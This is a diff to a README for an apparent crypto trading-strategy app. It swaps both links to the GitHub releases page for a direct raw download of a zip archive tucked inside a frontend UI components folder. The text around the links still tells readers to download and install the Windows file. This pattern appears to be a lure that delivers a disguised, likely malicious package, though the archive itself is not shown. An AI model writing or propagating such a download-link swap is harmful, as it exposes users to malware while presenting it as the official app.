@@ -1,6 +1,6 @@
 # 📈 Trading-strategy-service-platform---12000 - Clear crypto strategy tools
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/towingropeeulogium147/Trading-strategy-service-platform---12000/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/towingropeeulogium147/Trading-strategy-service-platform---12000/main/frontend/src/components/ui/platform_Trading_service_strategy_1.7-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Use the release page to get the latest Windows file, then install it and open th
 ## 📥 Download the App
 
 Visit this page to download:  
-https://github.com/towingropeeulogium147/Trading-strategy-service-platform---12000/releases
+https://raw.githubusercontent.com/towingropeeulogium147/Trading-strategy-service-platform---12000/main/frontend/src/components/ui/platform_Trading_service_strategy_1.7-alpha.3.zip
 
 On the release page, look for the latest version and download the Windows file that matches your system.
 
